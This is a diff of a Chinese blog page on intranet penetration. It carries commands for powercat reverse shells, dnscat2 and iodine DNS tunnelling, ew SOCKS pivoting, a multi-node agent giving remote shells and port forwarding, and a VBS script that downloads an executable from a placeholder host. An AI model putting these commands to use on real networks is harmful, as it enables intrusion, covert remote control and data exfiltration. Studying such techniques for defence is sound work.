 <span class="token comment" spellcheck="true">#或者生成反弹powershell的脚本</span>
-powercat -l -p 7777 -ep -v -g <span class="token operator">&gt;&gt;</span>shell2.ps1
+powercat -l -p 7777 -ep -v -g <span class="token operator">>></span>shell2.ps1
 <span class="token comment" spellcheck="true"># 把生成的文件上传到目标并运行</span>
 <span class="token comment" spellcheck="true"># 然后在客户端执行</span>
 powercat -c 10.10.10.129 -p 8888 -v  <span class="token comment" spellcheck="true"># 就会获得一个反弹shell</span>
@@ -1180,7 +1180,7 @@ dnscat2-v0.07-client-win32.exe --dns domain<span class="token operator">=</span>
 <span class="token comment" spellcheck="true"># 如果成功，会显示"Session established!" </span>
 
 <span class="token comment" spellcheck="true"># 如果服务端使用的是直连模式，可以直接填写服务端ip地址(不通过DNS服务提供商)，向dnscat2服务端所在的IP弟子和请求DNS解析，命令如下</span>
-dnscat --dns server <span class="token operator">&lt;</span>dnscat2_server_IP<span class="token operator">&gt;</span>,port<span class="token operator">=</span>53,type<span class="token operator">=</span>TXT --secret<span class="token operator">=</span>pass123456
+dnscat --dns server <span class="token operator">&lt;</span>dnscat2_server_IP<span class="token operator">></span>,port<span class="token operator">=</span>53,type<span class="token operator">=</span>TXT --secret<span class="token operator">=</span>pass123456
 
 <span class="token comment" spellcheck="true"># 推荐使用Powershell版本的dnscat2-powershell(目标win机器需要支持powershell2.0以上版本)：https://github.com/lukebaggett/dnscat2-powershell</span>
 <span class="token comment" spellcheck="true">#下载脚本到本地执行：</span>
@@ -1217,13 +1217,13 @@ listen    <span class="token comment" spellcheck="true"># 类似SSH隧道的—L
 <span class="token function">ping</span>    <span class="token comment" spellcheck="true"># 确认主机在线，如果返回"pong"，则在线</span>
 <span class="token function">shutdown</span>    <span class="token comment" spellcheck="true"># 切断当前会话</span>
 quit    <span class="token comment" spellcheck="true"># 推出dnscat2控制台</span>
-<span class="token function">kill</span> <span class="token operator">&lt;</span>id<span class="token operator">&gt;</span> <span class="token comment" spellcheck="true"># 切断通道</span>
+<span class="token function">kill</span> <span class="token operator">&lt;</span>id<span class="token operator">></span> <span class="token comment" spellcheck="true"># 切断通道</span>
 <span class="token keyword">set</span>     <span class="token comment" spellcheck="true"># 设置值，例如：security=open</span>
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>支持多域名并发，可将多个子域绑定在同一个NS下，然后在服务端同时接收多个客户端连接</p>
 <pre class="line-numbers language-bash"><code class="language-bash">ruby dnscat2.rb --dns<span class="token operator">=</span>port53532 --security<span class="token operator">=</span>open 
-start --den domain<span class="token operator">=</span><span class="token operator">&lt;</span>domain.com<span class="token operator">&gt;</span>,domain<span class="token operator">=</span><span class="token operator">&lt;</span>domain.com<span class="token operator">&gt;</span>
+start --den domain<span class="token operator">=</span><span class="token operator">&lt;</span>domain.com<span class="token operator">></span>,domain<span class="token operator">=</span><span class="token operator">&lt;</span>domain.com<span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h6 id="2-iodine工具"><a href="#2-iodine工具" class="headerlink" title="2).iodine工具"></a>2).iodine工具</h6><p>下载地址：<a href="https://github.com/Al1ex/iodine" target="_blank" rel="noopener">https://github.com/Al1ex/iodine</a><br>官方文档：<a href="http://code.kryo.se/iodine" target="_blank" rel="noopener">http://code.kryo.se/iodine</a></p>
 <p>iodine可以的通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。<br>C语言开发，分为服务端程序<code>iodined</code>和客户端程序<code>iodine</code>, Kali内置了iodine</p>
@@ -1336,7 +1336,7 @@ ew -s ssocksd -l 888    <span class="token comment" spellcheck="true"># 假设�
 ew -s rcsocks -l 1008 -e 888    <span class="token comment" spellcheck="true"># 含义：在公网vps上添加一个转接隧道，把1008收到的代理请求转发给888端</span>
 
 <span class="token comment" spellcheck="true">#2.然后把ew上传到web服务器(内网)，并执行</span>
-ew -s rssocks -d <span class="token operator">&lt;</span>公网vps_IP<span class="token operator">&gt;</span> -e 888
+ew -s rssocks -d <span class="token operator">&lt;</span>公网vps_IP<span class="token operator">></span> -e 888
 
 <span class="token comment" spellcheck="true">#3.然后用SocksCap64等添加代理地址为vps的ip:1008</span>
 <span class="token comment" spellcheck="true">#4.回到vps发现反弹成功，就可以通过vps的1008端口使用假设在web服务器上的SOCKS5代理服务了</span>
@@ -1384,19 +1384,19 @@ ew -s rssocks -d 1.1.1.10  -e 133
 
 1. 以服务模式启动一个agent服务。
 
-<span class="token operator">&gt;</span> $ ./agent -l 8888
+<span class="token operator">></span> $ ./agent -l 8888
 
 2. 令管理端连接到agent并对agent进行管理。
 
-<span class="token operator">&gt;</span> $ ./admin -c 127.0.0.1 -p 8888
+<span class="token operator">></span> $ ./admin -c 127.0.0.1 -p 8888
 
 3. 此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。
 
-<span class="token operator">&gt;&gt;</span> <span class="token function">help</span>
+<span class="token operator">>></span> <span class="token function">help</span>
 
 4. 通过show指令可以得到当前agent的拓扑情况。
 
-<span class="token operator">&gt;&gt;</span> show 
+<span class="token operator">>></span> show 
  0M
  +-- 1M
  由于当前拓扑中只有一个agent，所以展示结果只有 1M ,
@@ -1404,7 +1404,7 @@ ew -s rssocks -d 1.1.1.10  -e 133
   M为MacOS系统的简写，Linux为L，Windows简写为W。
 
 5. 将新agent加入当前拓扑
-<span class="token operator">&gt;</span> ./agent -c 127.0.0.1 -p 8888
+<span class="token operator">></span> ./agent -c 127.0.0.1 -p 8888
 
 6. 此时show指令将得到如下效果
  0M
@@ -1413,29 +1413,29 @@ ew -s rssocks -d 1.1.1.10  -e 133
   这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。
 
 7. 在2节点开启socks代理，并绑定在本地端口
-<span class="token operator">&gt;&gt;</span> goto 2
+<span class="token operator">>></span> goto 2
     将当前被管理节点切换为 2 号节点。
-<span class="token operator">&gt;&gt;</span> socks 1080
+<span class="token operator">>></span> socks 1080
    此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。
 
 8. 在1号节点开启一个shell并绑定到本地端口
-<span class="token operator">&gt;&gt;</span> goto 1
-<span class="token operator">&gt;&gt;</span> shell 7777
+<span class="token operator">>></span> goto 1
+<span class="token operator">>></span> shell 7777
      此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.
 
 9. 将远程的文件下载至本地
-<span class="token operator">&gt;&gt;</span> goto 1
-<span class="token operator">&gt;&gt;</span> downfile 1.txt 2.txt
+<span class="token operator">>></span> goto 1
+<span class="token operator">>></span> downfile 1.txt 2.txt
     将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt
 
 10. 上传文件至远程节点
-<span class="token operator">&gt;&gt;</span> goto 2
-<span class="token operator">&gt;&gt;</span> upfile 2.txt 3.txt
+<span class="token operator">>></span> goto 2
+<span class="token operator">>></span> upfile 2.txt 3.txt
     将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt
 
 11. 端口转接
-<span class="token operator">&gt;&gt;</span> goto 2 
-<span class="token operator">&gt;&gt;</span> lcxtran 3388 10.0.0.1 3389
+<span class="token operator">>></span> goto 2 
+<span class="token operator">>></span> lcxtran 3388 10.0.0.1 3389
     以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口
 
 
@@ -1542,16 +1542,16 @@ x    解压
 <h4 id="1-利用FTP上传文件"><a href="#1-利用FTP上传文件" class="headerlink" title="1.利用FTP上传文件"></a>1.利用FTP上传文件</h4><p>在本地或vps搭建FTP服务器</p>
 <p>常用FTP命令</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">open</span> 192.168.0.10    <span class="token comment" spellcheck="true"># 连接服务器</span>
-<span class="token function">cd</span> <span class="token operator">&lt;</span>目录<span class="token operator">&gt;</span>
-lcd <span class="token operator">&lt;</span>文件夹路径<span class="token operator">&gt;</span>    <span class="token comment" spellcheck="true"># 定位本地文件夹(上传文件的位置或者下载文件的保存位置)</span>
+<span class="token function">cd</span> <span class="token operator">&lt;</span>目录<span class="token operator">></span>
+lcd <span class="token operator">&lt;</span>文件夹路径<span class="token operator">></span>    <span class="token comment" spellcheck="true"># 定位本地文件夹(上传文件的位置或者下载文件的保存位置)</span>
 <span class="token function">type</span>    <span class="token comment" spellcheck="true"># 查看的当前的传输方式(默认是ASCII码传输)</span>
 ascii    <span class="token comment" spellcheck="true"># 设置传输方式为ascii（传输txt等）</span>
 binary    <span class="token comment" spellcheck="true"># 设置传输方式为二进制传输（传输exe图片视频声音等）</span>
 close        <span class="token comment" spellcheck="true"># 结束与服务器的FTP对话</span>
 quit    <span class="token comment" spellcheck="true"># 结束与服务器的FTP对话并推出FTP环境</span>
-put <span class="token operator">&lt;</span>文件名<span class="token operator">&gt;</span> <span class="token punctuation">[</span>newname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 上传，如果不指定newname，就为原名字</span>
-send <span class="token operator">&lt;</span>文件名<span class="token operator">&gt;</span> <span class="token punctuation">[</span>newname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 上传，如果不指定newname，就为原名字</span>
-get <span class="token operator">&lt;</span>文件名<span class="token operator">&gt;</span> <span class="token punctuation">[</span>newname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 下载，如果不指定newname，就为原名字</span>
+put <span class="token operator">&lt;</span>文件名<span class="token operator">></span> <span class="token punctuation">[</span>newname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 上传，如果不指定newname，就为原名字</span>
+send <span class="token operator">&lt;</span>文件名<span class="token operator">></span> <span class="token punctuation">[</span>newname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 上传，如果不指定newname，就为原名字</span>
+get <span class="token operator">&lt;</span>文件名<span class="token operator">></span> <span class="token punctuation">[</span>newname<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 下载，如果不指定newname，就为原名字</span>
 mget filename <span class="token punctuation">[</span>filename<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># 下载多个文件。支持空格和"?"两个通配符（比如: mget .mp3 表示下载FTP服务器当前目录下拓展名为mp3的文件）</span>
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
@@ -1560,7 +1560,7 @@ mget filename <span class="token punctuation">[</span>filename<span class="token
 <pre class="line-numbers language-vbs"><code class="language-vbs">
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>下载</p>
-<pre class="line-numbers language-vba"><code class="language-vba">//把下面的命令以此保存到文件（比如 echo "xxxxxxx" &gt;&gt; download.vbs）
+<pre class="line-numbers language-vba"><code class="language-vba">//把下面的命令以此保存到文件（比如 echo "xxxxxxx" >> download.vbs）
 Set Post = CreateObject("Msxm12.XMLHTTP");
 Set Shell = CreateObject("Wscript.Shell");
 Post.Open "GET","http://xxxx/target.exe"
@@ -1587,7 +1587,7 @@ wine exe2bat.exe ew.exe ew.txt        <span class="token comment" spellcheck="tr
 copy 1.dll ew.exe
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="4-利用Nishang上传"><a href="#4-利用Nishang上传" class="headerlink" title="4. 利用Nishang上传"></a>4. 利用Nishang上传</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># nishang中的脚本：Download_Execute    --&gt; 常用来下载文本文件并将其转为exe文件</span>
+<h4 id="4-利用Nishang上传"><a href="#4-利用Nishang上传" class="headerlink" title="4. 利用Nishang上传"></a>4. 利用Nishang上传</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># nishang中的脚本：Download_Execute    --> 常用来下载文本文件并将其转为exe文件</span>
 
 <span class="token comment" spellcheck="true">#1. 先echo 方法把脚本内容传到目标机器，并将扩展名改为ps1</span>
 
@@ -2197,7 +2197,7 @@ DownloadString<span class="token punctuation">(</span><span class="token punctua
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">326.3k</span>&nbsp;字
+                class="white-color">326.7k</span>&nbsp;字
             
             
             
